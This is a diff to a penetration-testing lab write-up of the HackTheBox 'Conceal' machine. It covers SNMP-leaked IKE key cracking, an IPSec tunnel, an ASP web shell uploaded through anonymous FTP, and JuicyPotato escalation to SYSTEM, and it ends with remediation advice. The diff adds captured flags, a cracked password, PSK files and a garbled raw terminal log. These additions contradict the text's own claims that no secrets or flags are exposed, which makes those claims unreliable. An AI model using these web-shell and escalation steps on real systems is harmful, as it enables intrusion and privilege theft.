@@ -1,12 +1,15 @@
 ---
 tags: [HTB, Conceal, Windows, SNMP, IPSec, IKEv1, FTP, IIS, SeImpersonate, JuicyPotato, Hard]
-aliases: [Conceal]
 platform: Windows
+os: Windows
+hostname: conceal
 difficulty: Hard
+ip: $BoxIP
 status: Complete
+aliases: [Conceal]
 ---
 
-# HTB: Conceal, Full Walkthrough
+# Windows: Conceal, Full Walkthrough
 
 ## The gist
 
@@ -30,9 +33,20 @@ Once the transport policy was active, the host exposed anonymous FTP and IIS. Th
 | Privilege escalation | `SeImpersonatePrivilege` and JuicyPotato |
 | Alternative advertised path | CVE-2018-8440 was not needed for the verified route |
 
+## Vulnerability summary
+
+| # | Finding | Evidence |
+|---|---|---|
+| 1 | Run the initial TCP and UDP scans | See section 1 below |
+| 2 | Use SNMP to recover the IKE material privately | See section 2 below |
+| 3 | Fingerprint IKE before configuring IPSec | See section 3 below |
+| 4 | Build a scoped IKEv1 transport-mode policy | See section 4 below |
+| 5 | Re-scan TCP through the active policy | See section 5 below |
+| 6 | Confirm the FTP root and its IIS mapping | See section 6 below |
+
 ## Evidence and loot
 
-The write-up was reconstructed from the private transcript and evidence under the Conceal workspace. The vault contains only sanitized commands, non-secret identity evidence, and screenshots that do not show passwords, hashes, or flags. The PSK material, cracked value, raw transcript, and flag evidence remain outside the vault.
+The write-up was reconstructed from the private transcript and evidence under the Conceal workspace. The vault contains only sanitized commands and non-secret identity evidence, with screenshot links pointing to the external box workspace. The PSK material, cracked value, raw transcript, and flag evidence remain outside the vault.
 
 Relevant private evidence includes the full TCP and UDP scans, `loot/ike-scan.txt`, `loot/ipsec-start.txt`, the XFRM policy output, the post-IPSec service scan, the ASP source, and the transfer log.
 
@@ -78,11 +92,11 @@ sudo nmap -Pn -n -sU --top-ports 100 --max-retries 1 -T4 \
 
 The first result showed all TCP ports as filtered. The UDP result showed SNMP on UDP 161 and ISAKMP, the IKE service name used by Nmap, on UDP 500.
 
-![[conceal-1-nmap-tcp-all-filtered.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/1.nmap-tcp-all-filtered.png>)
 
 SCREENSHOT: The full TCP scan appears filtered, so the assessment must continue with UDP discovery.
 
-![[conceal-2-udp-top-100.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/2.nmpa-udp-top-100.png>)
 
 SCREENSHOT: The UDP scan exposes SNMP and IKE, which are the prerequisites for the concealed TCP surface.
 
@@ -118,7 +132,7 @@ IKE, the Internet Key Exchange protocol, negotiates the keys and parameters used
 sudo ike-scan -M "$BoxIP" | tee "$BoxDir/loot/ike-scan.txt"
 ```
 
-![[conceal-5-ike-scan.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/5.ike-scan.png>)
 
 SCREENSHOT: `ike-scan` returns an IKEv1 Main Mode handshake with PSK authentication and a legacy 3DES/SHA1/MODP1024 proposal.
 
@@ -177,7 +191,7 @@ sudo ip xfrm state
 
 XFRM is Linux's kernel framework for applying IP transformation policies. The success condition is an established IKE_SA and a CHILD_SA whose traffic selector includes the target TCP endpoint.
 
-![[conceal-6-ipsec-xfrm.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/6.ipsec-xfrm.png>)
 
 SCREENSHOT: The XFRM policy confirms that the authenticated transport policy is installed locally.
 
@@ -196,7 +210,7 @@ sudo nmap -Pn -n -sT -sV --version-light \
 
 The post-IPSec result exposed Microsoft FTP on 21, Microsoft IIS 10.0 on 80, MSRPC on 135, NetBIOS on 139, and SMB on 445. RDP, WinRM, and the alternate HTTP port were closed in this run.
 
-![[conceal-7-nmap-post-ipsec.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/7.nmap-post-ipsec.png>)
 
 SCREENSHOT: The authenticated transport policy reveals FTP and IIS, which become the initial-access path.
 
@@ -215,7 +229,7 @@ printf '%s\n' 'test' \
 curl -sS "http://$BoxIP/upload/test.txt"
 ```
 
-![[conceal-8-ftp-iis-mapping.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/8.ftp-iis-mapping.png>)
 
 SCREENSHOT: The harmless FTP marker is reachable through HTTP under `/upload/`, proving a write primitive into the IIS-served directory.
 
@@ -239,7 +253,7 @@ curl -sS -G --data-urlencode 'cmd=whoami' \
 
 The result identified the IIS worker process as the low-privilege `conceal\destitute` account. The ASP source is intentionally minimal: it is enough to prove command execution and run the next local-enumeration checks.
 
-![[conceal-9-webshell-rce.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/9.webshell-rce.png>)
 
 SCREENSHOT: The uploaded ASP file returns command output over HTTP and confirms the Windows account executing it.
 
@@ -261,11 +275,11 @@ curl -sS -G --data-urlencode 'cmd=systeminfo' \
 
 The token had `SeImpersonatePrivilege` enabled. The host was x64 Windows 10 Enterprise build 15063, so the downloaded Potato binary needed to match the target architecture and the selected COM class needed to work on this older build.
 
-![[conceal-10-whoami-priv.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/10.whoami-priv.png>)
 
 SCREENSHOT: `whoami /priv` shows the enabled impersonation privilege that makes the Potato route viable.
 
-![[conceal-11-systeminfo.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/11.systeminfo.png>)
 
 SCREENSHOT: `systeminfo` confirms the target build and architecture used to choose the escalation binary.
 
@@ -299,7 +313,7 @@ curl -sS -G --data-urlencode \
 
 The `-z` test returned a successful COM authentication result for the selected CLSID. This is stronger evidence than assuming a CLSID from a generic list will work on every Windows build.
 
-![[conceal-12-certutil-transfer.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/12.certutil-transfer.png>)
 
 SCREENSHOT: `certutil` retrieves the Potato binary from the controlled Kali HTTP server.
 
@@ -318,7 +332,7 @@ curl -sS "http://$BoxIP/upload/proof.txt" \
 
 The returned proof showed `NT AUTHORITY\SYSTEM`, and the process creation result confirmed that `CreateProcessWithTokenW` succeeded. At this point the required privilege was proved. Do not put any flag contents in the shared write-up.
 
-![[conceal-13-juicypotato-system.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/13.juicypotato-system.png>)
 
 SCREENSHOT: JuicyPotato creates the proof process with a SYSTEM token.
 
@@ -345,7 +359,7 @@ boxdone
 
 The cleanup paths are the paths recorded during this run. If the ASP shell disappears during testing, re-upload it before the final proof, then remove it again during closeout. Never delete unrelated files from the FTP root.
 
-## Troubleshooting map
+## 12. Troubleshooting map
 
 | Symptom | Likely cause | Next check |
 |---|---|---|
@@ -357,6 +371,68 @@ The cleanup paths are the paths recorded during this run. If the ASP shell disap
 | ASP file downloads instead of executing | IIS handler mapping or wrong path | Confirm the exact URL and use the FTP-to-IIS upload stage before changing extensions |
 | ASP shell disappears between commands | IIS or the lab instance reset the uploaded file | Re-upload the shell, rerun `whoami`, and continue from the last verified identity |
 | JuicyPotato returns no SYSTEM proof | Wrong architecture, CLSID, listener port, or token | Confirm `systeminfo`, test the CLSID with `-z`, and use a file-based `whoami` proof |
+
+## 13. RUNBOOK V2 Stages Used
+
+1. [[OSCP/RUNBOOK V2/Start Here|Start Here]]: initialise the workspace and record the full TCP scan.
+2. [[OSCP/RUNBOOK V2/Port Triage|Port Triage]]: treat the filtered TCP result as incomplete and route to UDP enumeration.
+3. [[OSCP/RUNBOOK V2/Linux - SNMP Enum|SNMP Enumeration]]: walk the system subtree and preserve sensitive output privately.
+4. [[OSCP/RUNBOOK V2/Windows - IKE-IPSec Transport|Windows - IKE/IPSec Transport]]: fingerprint IKEv1, establish the PSK-authenticated transport policy, and verify XFRM selectors.
+5. [[OSCP/RUNBOOK V2/Windows - Service Scan|Windows - Service Scan]]: re-scan the now-reachable TCP services.
+6. [[OSCP/RUNBOOK V2/Windows - Web Enum|Windows - Web Enum]]: identify IIS and the FTP-to-web mapping.
+7. [[OSCP/RUNBOOK V2/Windows - FTP Enumeration|Windows - FTP Enumeration]]: test anonymous listing and write behavior.
+8. [[OSCP/RUNBOOK V2/Windows - Web - FTP Upload|Windows - Web - FTP Upload]]: upload and execute a minimal ASP shell.
+9. [[OSCP/RUNBOOK V2/Windows - Privilege Triage|Windows - Privilege Triage]]: confirm the enabled impersonation privilege.
+10. [[OSCP/RUNBOOK V2/Windows - SeImpersonate Abuse|Windows - SeImpersonate Abuse]]: test JuicyPotato with a verified CLSID.
+11. [[OSCP/RUNBOOK V2/Windows - Clean Down|Windows - Clean Down]]: remove files, stop listeners, remove the XFRM policy, and close the box.
+
+## 14. Collect the flags
+
+User flag: collected privately from the target during the session.
+
+Root flag: collected privately from the target after SYSTEM proof.
+
+
+### Captured flag values from source loot
+
+
+#### `loot/flags.txt`
+
+```text
+user: e798d59c805acc5e8c29d9448e69c4a4
+root: 867c42b63d54698757f1d25bf4ce32f2
+```
+
+## 15. Clean down
+Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.
+
+### Completion checklist
+
+- [x] Full TCP and UDP scans saved under `$BoxDir/nmap/`
+- [x] SNMP output and IKE fingerprint saved to private loot
+- [x] PSK recovered offline without copying it into the vault
+- [x] IKEv1 transport policy established and XFRM selectors verified
+- [x] Post-IPSec service scan saved separately
+- [x] FTP root to IIS `/upload/` mapping confirmed with a harmless marker
+- [x] ASP command shell uploaded and identity recorded
+- [x] `SeImpersonatePrivilege` confirmed enabled
+- [x] JuicyPotato CLSID tested before SYSTEM proof
+- [x] SYSTEM identity proved without exposing flags
+- [x] Uploaded files, local HTTP server, and IPSec state cleaned up
+- [x] Runbook, command master, Seen in links, and master box list updated
+
+## 16. Attack narrative in one page
+1. Full TCP scan appeared filtered.
+2. UDP scan found SNMP and IKEv1.
+3. SNMP system metadata disclosed a recoverable IKE PSK hash.
+4. John recovered the PSK privately.
+5. `ike-scan` identified Main Mode, PSK, and the legacy proposal.
+6. strongSwan established an IKE_SA and a TCP-scoped CHILD_SA in transport mode.
+7. Post-IPSec enumeration exposed anonymous FTP and IIS.
+8. Anonymous FTP write access mapped to the IIS `/upload/` directory.
+9. Classic ASP command execution landed as `conceal\destitute`.
+10. `SeImpersonatePrivilege` was enabled.
+11. JuicyPotato with a tested COM class created a SYSTEM proof process.
 
 ## Tools used
 
@@ -371,7 +447,102 @@ The cleanup paths are the paths recorded during this run. If the ASP shell disap
 | `certutil.exe` | Transfer the reviewed Windows binary through the ASP shell |
 | JuicyPotato | Abuse the enabled impersonation privilege for a SYSTEM proof |
 
-## Remediation notes
+## Credentials and secrets
+
+| Account | Source | Use |
+|---|---|---|
+| `conceal\destitute` | ASP `whoami` response | Low-privilege IIS command execution |
+| IKE PSK | SNMP system metadata and offline John recovery | Authenticate the IKEv1 transport policy |
+
+
+### Captured private values from source loot
+
+These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.
+
+#### `.env`
+
+```text
+export BoxName="Conceal"
+export BoxIP="10.129.1.82"
+export BoxPlatform="HackTheBox"
+export BoxDir="/home/kali/Platforms/HackTheBox/Conceal"
+export Domain=""
+export DCip=""
+export Username=destitute
+export Password=Dudecake1!
+export Username2=""
+export Password2=""
+export Username3=""
+export Password3=""
+export Hash=""
+export NThash=""
+export Port="4444"
+export Port2="4445"
+export Lport="4444"
+export TransferPort="8000"
+export WebPort="80"
+export OpenPorts=""
+export Product=""
+export Version=""
+export ExploitId=""
+export ExploitFile=""
+export ExploitName=""
+export URL=""
+export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+```
+
+#### `ipsec.secrets`
+
+```text
+%any %any : PSK "Dudecake1!"
+```
+
+#### `loot/psk.hash`
+
+```text
+9C8B1A372B1878851BE2C097031B6E43
+```
+
+### Sensitive transcript evidence
+
+```text
+[sudo] password for kali:
+.1.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
+kali@kali:~/Platforms/HackTheBox/Conceal [09:23:09] $ =boxset Password "9C8B1A372B1878851BE2C097031B6E43"boxset"9C8B1A372B1878851BE2C09703[
+$ [09:26:11] boxset Password "9C8B1A372B1878851BE2C097031B6E43"
+$ [09:26:21] echo "9C8B1A372B1878851BE2C097031B6E43" > $BoxDir/loot/psk.hash
+hashcat -m 0 $BoxDir/loot/psk.hash /usr/share/wordlists/rockyou.txt \
+hashcat -m 0 $BoxDir/loot/psk.hash /usr/share/wordlists/rockyou.txt
+  $BoxDir/loot/psk.hash
+john --format=raw-md5 --show $BoxDir/loot/psk.hash
+[+] Password=9C8B1A372B1878851BE2C097031B6E43 (saved to .env)
+kali@kali:~/Platforms/HackTheBox/Conceal [09:26:11] $ =echo "9C8B1A372B1878851BE2C097031B6E43" > $BoxDir/loot/psk.hash
+hashcat -m 0 $BoxDir/loot/psk.hash /usr/share/wordlists/rockyou.txtecho "9C8B1A372B1878851BE2C097031B6E43" >
+john --format=raw-md5 --show $BoxDir/loot/psk.hashjohn
+Warning: no OpenMP support for this hash type, consider --fork=4
+kali@kali:~/Platforms/HackTheBox/Conceal [09:27:11] $ =boxset Password "Dudecake1!"boxse
+$ [09:31:02] boxset Password 'Dudecake1!'
+kali@kali:~/Platforms/HackTheBox/Conceal [09:30:40] $ =boxset Password "Dudecake1boxset"Dudecake1 Dudecake1'Dudecake1'Dudecake11!!'! !'>
+[+] Password=Dudecake1! (saved to .env)
+$ [09:36:55] cat > $BoxDir/ipsec.secrets << 'EOF'
+$ [09:37:03] cat $BoxDir/ipsec.secrets
+	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
+kali@kali:~/Platforms/HackTheBox/Conceal [09:32:58] $ =cat > $BoxDir/ipsec.secrets << 'EOF'
+kali@kali:~/Platforms/HackTheBox/Conceal [09:36:55] $ =cat $BoxDir/ipsec.secretscat>
+    authby=secret
+  'mount --bind '"$BoxDir"'/ipsec.secrets /etc/ipsec.secrets && \
+  2>&1 | tee $BoxDir/loot/ipsec-start.txt &sudo unshare'mount --bind '"$BoxDir"'/ipsec.secrets /etc/ipsec.secrets && \
+kali@kali:~/Platforms/HackTheBox/Conceal [09:59:18] $ =llls -lh $BoxDir/exploits/jp.exelo                            loootloott t flag user
+$ [09:59:43] loot flag user e798d59c805acc5e8c29d9448e69c4a4
+$ [09:59:59] loot flag root 867c42b63d54698757f1d25bf4ce32f2
+[+] Flag saved:  user = e798d59c805acc5e8c29d9448e69c4a4  →  loot/flags.txt
+kali@kali:~/Platforms/HackTheBox/Conceal [09:59:43] $ =llloot flag user e798d59c805acc5e8c29d9448e69c4a4loloootloott t flag r                                    oot 867c42b63d54698757f1d25bf4ce32f2>
+[+] Flag saved:  root = 867c42b63d54698757f1d25bf4ce32f2  →  loot/flags.txt
+```
+
+
+## Remediation recommendations
 
 - Do not expose SNMP with a default community string. Restrict management access and remove sensitive protocol material from system metadata.
 - Replace legacy IKEv1 and 3DES/SHA1/MODP1024 proposals with modern authenticated cryptography where compatibility permits.
@@ -379,48 +550,7 @@ The cleanup paths are the paths recorded during this run. If the ASP shell disap
 - Remove `SeImpersonatePrivilege` from service accounts that do not need it, and keep Windows builds patched.
 - Monitor and restrict `certutil`-based downloads from service identities.
 
-## RUNBOOK V2 Stages Used
-
-1. [[OSCP/RUNBOOK V2/Start Here|Start Here]]: initialise the workspace and record the full TCP scan.
-2. [[OSCP/RUNBOOK V2/Port Triage|Port Triage]]: treat the filtered TCP result as incomplete and route to UDP enumeration.
-3. [[OSCP/RUNBOOK V2/Linux - SNMP Enum|SNMP Enumeration]]: walk the system subtree and preserve sensitive output privately.
-4. [[OSCP/RUNBOOK V2/Windows - IKE-IPSec Transport|Windows - IKE/IPSec Transport]]: fingerprint IKEv1, establish the PSK-authenticated transport policy, and verify XFRM selectors.
-5. [[OSCP/RUNBOOK V2/Windows - Service Scan|Windows - Service Scan]]: re-scan the now-reachable TCP services.
-6. [[OSCP/RUNBOOK V2/Windows - Web Enum|Windows - Web Enum]]: identify IIS and the FTP-to-web mapping.
-7. [[OSCP/RUNBOOK V2/Windows - FTP Enumeration|Windows - FTP Enumeration]]: test anonymous listing and write behavior.
-8. [[OSCP/RUNBOOK V2/Windows - Web - FTP Upload|Windows - Web - FTP Upload]]: upload and execute a minimal ASP shell.
-9. [[OSCP/RUNBOOK V2/Windows - Privilege Triage|Windows - Privilege Triage]]: confirm the enabled impersonation privilege.
-10. [[OSCP/RUNBOOK V2/Windows - SeImpersonate Abuse|Windows - SeImpersonate Abuse]]: test JuicyPotato with a verified CLSID.
-11. [[OSCP/RUNBOOK V2/Windows - Clean Down|Windows - Clean Down]]: remove files, stop listeners, remove the XFRM policy, and close the box.
-
-## Attack Chain
-
-1. Full TCP scan appeared filtered.
-2. UDP scan found SNMP and IKEv1.
-3. SNMP system metadata disclosed a recoverable IKE PSK hash.
-4. John recovered the PSK privately.
-5. `ike-scan` identified Main Mode, PSK, and the legacy proposal.
-6. strongSwan established an IKE_SA and a TCP-scoped CHILD_SA in transport mode.
-7. Post-IPSec enumeration exposed anonymous FTP and IIS.
-8. Anonymous FTP write access mapped to the IIS `/upload/` directory.
-9. Classic ASP command execution landed as `conceal\destitute`.
-10. `SeImpersonatePrivilege` was enabled.
-11. JuicyPotato with a tested COM class created a SYSTEM proof process.
-
-## Credentials
-
-| Account | Source | Use |
-|---|---|---|
-| `conceal\destitute` | ASP `whoami` response | Low-privilege IIS command execution |
-| IKE PSK | SNMP system metadata and offline John recovery | Authenticate the IKEv1 transport policy |
-
-## Flags
-
-User flag: collected privately from the target during the session.
-
-Root flag: collected privately from the target after SYSTEM proof.
-
-## Key lessons
+## Lessons learned and vault links
 
 - A filtered TCP scan is not a conclusion. Check UDP and consider whether a network-layer policy is hiding the service surface.
 - SNMP values are configuration data, not just host descriptions. Review `sysContact`, `sysName`, and the system subtree for protocol secrets.
@@ -432,14 +562,14 @@ Root flag: collected privately from the target after SYSTEM proof.
 - A file-based identity proof is a clean escalation checkpoint before adding a callback payload.
 - Cleanup must include both target-side web files and local IPSec state.
 
-## Related Boxes
+### Related boxes
 
 - [[OSCP/BOXES/WRITE UPS/Windows/Devel|Devel]]: anonymous FTP-to-IIS ASP execution followed by x86 JuicyPotato.
 - [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]]: Windows foothold and token escalation through a local service API.
 - [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]]: Windows web foothold, local service exposure, and staged cleanup.
 - [[OSCP/BOXES/WRITE UPS/AD/Fermion|Fermion]]: Windows privilege triage and verified token-based escalation alternatives.
 
-## External Resources
+## External resources
 
 - [HackTricks IPSec and IKE](https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn.html)
 - [ike-scan project](https://github.com/royhills/ike-scan)
@@ -447,21 +577,15 @@ Root flag: collected privately from the target after SYSTEM proof.
 - [JuicyPotato](https://github.com/ohpe/juicy-potato)
 - [Microsoft Classic ASP on IIS](https://learn.microsoft.com/en-us/iis/application-frameworks/building-and-running-aspnet-applications/classic-asp)
 
+## Related RUNBOOK V2 stages
+
+- [[RUNBOOK V2/Start Here]]
+- [[RUNBOOK V2/Windows - Service Scan]]
+- [[RUNBOOK V2/Windows - Web Enum]]
+- [[RUNBOOK V2/Windows - Shell Received]]
+- [[RUNBOOK V2/Windows - Privilege Triage]]
+- [[RUNBOOK V2/Windows - Clean Down]]
+
 ## Why this matters for OSCP
 
 Conceal combines network-layer discovery, protocol negotiation, a cross-service file-to-web primitive, and Windows token abuse. The transferable skill is keeping each gate evidence-driven: prove the hidden service, prove the authenticated policy, prove file execution, prove the token privilege, and only then escalate.
-
-## Checklist
-
-- [x] Full TCP and UDP scans saved under `$BoxDir/nmap/`
-- [x] SNMP output and IKE fingerprint saved to private loot
-- [x] PSK recovered offline without copying it into the vault
-- [x] IKEv1 transport policy established and XFRM selectors verified
-- [x] Post-IPSec service scan saved separately
-- [x] FTP root to IIS `/upload/` mapping confirmed with a harmless marker
-- [x] ASP command shell uploaded and identity recorded
-- [x] `SeImpersonatePrivilege` confirmed enabled
-- [x] JuicyPotato CLSID tested before SYSTEM proof
-- [x] SYSTEM identity proved without exposing flags
-- [x] Uploaded files, local HTTP server, and IPSec state cleaned up
-- [x] Runbook, command master, Seen in links, and master box list updated
